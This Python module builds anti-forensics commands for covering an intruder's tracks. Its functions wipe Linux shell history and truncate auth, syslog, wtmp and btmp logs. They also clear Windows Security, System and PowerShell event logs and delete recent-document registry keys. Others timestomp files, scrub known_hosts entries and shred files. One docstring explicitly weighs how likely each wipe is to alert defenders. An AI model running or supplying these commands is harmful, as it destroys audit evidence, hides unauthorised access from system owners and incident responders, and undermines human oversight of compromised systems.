"""Artefact cleanup and anti-forensics command builders."""

from __future__ import annotations

__all__ = [
    "clean_history_commands",
    "clean_linux_logs",
    "clean_windows_artifacts",
    "timestomp_command",
    "remove_ssh_known_host",
    "secure_delete_command",
]


def clean_history_commands() -> list[str]:
    """Return shell commands that wipe common Linux shell history artefacts."""
    return [
        "unset HISTFILE",
        "export HISTSIZE=0",
        "export HISTFILESIZE=0",
        "history -c",
        "cat /dev/null > ~/.bash_history",
        "cat /dev/null > ~/.zsh_history",
        "ln -sf /dev/null ~/.bash_history",
    ]


def clean_linux_logs(*, aggressive: bool = False) -> list[str]:
    """Return commands to clear common Linux log artefacts.

    Args:
        aggressive: When True, also truncate wtmp/btmp/lastlog/utmp.
            These generate more noise and are more likely to alert defenders.
    """
    cmds = [
        "truncate -s 0 /var/log/auth.log 2>/dev/null || true",
        "truncate -s 0 /var/log/secure 2>/dev/null || true",
        "truncate -s 0 /var/log/syslog 2>/dev/null || true",
        "truncate -s 0 /var/log/messages 2>/dev/null || true",
        "truncate -s 0 /var/log/kern.log 2>/dev/null || true",
    ]
    if aggressive:
        cmds += [
            "truncate -s 0 /var/log/wtmp",
            "truncate -s 0 /var/log/btmp",
            "truncate -s 0 /var/log/lastlog",
            "truncate -s 0 /var/run/utmp",
        ]
    return cmds


def clean_windows_artifacts() -> list[str]:
    """Return PowerShell/cmd snippets that remove common Windows forensic artefacts."""
    return [
        "wevtutil cl Security 2>nul",
        "wevtutil cl System 2>nul",
        "wevtutil cl Application 2>nul",
        "wevtutil cl 'Windows PowerShell' 2>nul",
        "Remove-Item -Path $env:TEMP\\* -Recurse -Force -ErrorAction SilentlyContinue",
        "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs /f 2>nul",
        "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f 2>nul",
        "[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog('Security')",
    ]


def timestomp_command(target: str, reference: str) -> str:
    """Return a ``touch`` command that clones timestamps from *reference* onto *target*."""
    return f"touch -r '{reference}' '{target}'"


def remove_ssh_known_host(hostname: str) -> str:
    """Return a command to remove *hostname* from ``~/.ssh/known_hosts``."""
    return f"ssh-keygen -R '{hostname}' 2>/dev/null; true"


def secure_delete_command(
    path: str,
    *,
    passes: int = 3,
    recursive: bool = False,
) -> str:
    """Return a shred command for secure file deletion.

    Falls back to ``rm -rf`` when shred is unavailable.
    """
    r_flag = " -r" if recursive else ""
    return (
        f"shred -uzn {passes}{r_flag} '{path}' 2>/dev/null "
        f"|| rm -rf '{path}' 2>/dev/null"
    )
